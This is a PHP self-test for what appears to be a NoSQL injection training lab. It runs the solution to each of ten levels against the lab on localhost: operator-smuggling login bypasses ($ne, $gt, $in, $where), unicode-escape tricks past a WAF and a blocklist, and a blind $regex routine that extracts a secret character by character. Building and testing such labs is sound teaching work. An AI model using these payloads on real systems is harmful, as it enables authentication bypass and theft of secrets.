<?php
/**
 * NoSQL Injection Lab self-test: runs the intended solution for every level
 * against the live app, so a level that has quietly stopped being solvable is
 * caught. Levels 4 and 7 perform a genuine character-by-character extraction
 * rather than pasting the answer, because that is what they teach.
 *
 *   docker compose exec -T web php /var/www/html/solve_check.php
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($fields),
        'timeout' => 30,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function get(string $url): string
{
    $ctx = stream_context_create(['http' => [
        'method' => 'GET', 'timeout' => 30, 'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

/** POST a JSON document as the `query` field of the login form. */
function post_json(string $url, string $json): string
{
    return post($url, ['query' => $json]);
}

/**
 * Levels 4 and 7 print their flag inside hint 5, so a bare "is the flag in the
 * body" test would pass without solving anything. $marker pins the award block.
 */
function check(int $level, string $body, string $note = '', string $marker = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    $awarded = ($marker === '' || strpos($body, $marker) !== false);
    if ($want !== '' && $awarded && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

/**
 * Escape exactly the metacharacters that nosql_regex_fully_matches() knows how
 * to unescape, so an anchored probe still compares equal to the raw secret.
 */
function rx_quote(string $s): string
{
    $meta = ['{', '}', '[', ']', '(', ')', '.', '+', '*', '?', '^', '$', '|', '/', chr(92)];
    $out  = '';
    foreach (str_split($s) as $ch) {
        $out .= in_array($ch, $meta, true) ? chr(92) . $ch : $ch;
    }
    return $out;
}

/**
 * Blind extraction of the admin secret through a $regex oracle.
 * $probe(string $regex): bool  — true when the oracle says "matched".
 */
function extract_secret(callable $probe): string
{
    $charset = array_merge(
        range('A', 'Z'), range('a', 'z'), range('0', '9'),
        ['_', '{', '}', '-', '!', '@', '?', '.', '$']
    );
    $prefix = '';
    for ($i = 0; $i < 64; $i++) {
        $found = false;
        foreach ($charset as $c) {
            if ($probe('^' . rx_quote($prefix . $c))) {
                $prefix .= $c;
                $found = true;
                break;
            }
        }
        if (!$found) break;
        // Anchor test: have we reached the end of the secret?
        if ($probe('^' . rx_quote($prefix) . '$')) {
            return $prefix;
        }
    }
    return $prefix;
}

echo "NoSQL Injection Lab self-test\n-----------------------------\n";

/* 1 - operator object smuggled into a field the developer expected to be a string */
check(1, post_json("$base/level1.php", '{"username":"admin","password":{"$ne":null}}'), '$ne bypass');

/* 2 - PHP query-string bracket syntax builds the same operator object */
check(2, get("$base/level2.php?username=admin&password%5B%24ne%5D=x"), 'password[$ne]=x');

/* 3 - "$ne" is blacklisted as a substring; another comparison operator is not */
check(3, post_json("$base/level3.php", '{"username":"admin","password":{"$gt":""}}'), '$gt past the $ne blocklist');

/* 4 - $regex match/no-match oracle, extracted one character at a time */
$probe4 = function (string $rx): bool {
    $body = post_json('http://localhost/level4.php',
        json_encode(['username' => 'admin', 'password' => ['$regex' => $rx]]));
    return strpos($body, 'class="oracle match"') !== false;
};
$secret4 = extract_secret($probe4);
$body4 = post_json("$base/level4.php",
    json_encode(['username' => 'admin', 'password' => ['$regex' => '^' . rx_quote($secret4) . '$']]));
check(4, $body4, "extracted '$secret4' char by char", 'Secret fully extracted!');

/* 5 - the whole body is the filter, so a top-level operator widens the search */
check(5, post_json("$base/level5.php", '{"role":{"$in":["user","admin"]}}'), '$in widens the role filter');

/* 6 - $where evaluates an attacker-supplied predicate per document */
check(6, post_json("$base/level6.php", '{"$where":"1==1"}'), '$where tautology');

/* 7 - blind: only $regex is allowed, and the only feedback is one bit */
$probe7 = function (string $rx): bool {
    $body = post_json('http://localhost/level7.php',
        json_encode(['username' => 'admin', 'password' => ['$regex' => $rx]]));
    return strpos($body, 'class="oracle match"') !== false;
};
$secret7 = extract_secret($probe7);
$body7 = post_json("$base/level7.php",
    json_encode(['username' => 'admin', 'password' => ['$regex' => '^' . rx_quote($secret7) . '$']]));
check(7, $body7, "extracted '$secret7' from one bit", 'Flag reconstructed!');

/* 8 - the WAF reads raw bytes; \u0024 carries the $ past it */
check(8, post_json("$base/level8.php", '{"username":"admin","password":{"\u0024ne":null}}'), '\u0024 escape');

/* 9 - === is type sensitive, so an array username skips the deny */
check(9, get("$base/level9.php?username%5B%24eq%5D=admin&password%5B%24ne%5D=x"), 'array !== string admin');

/* 10 - unicode escape past L1, string username past L2, $gt missing from L3 */
check(10, post_json("$base/level10.php", '{"username":"admin","password":{"\u0024gt":""}}'), '\u0024gt through three layers');

echo "-----------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
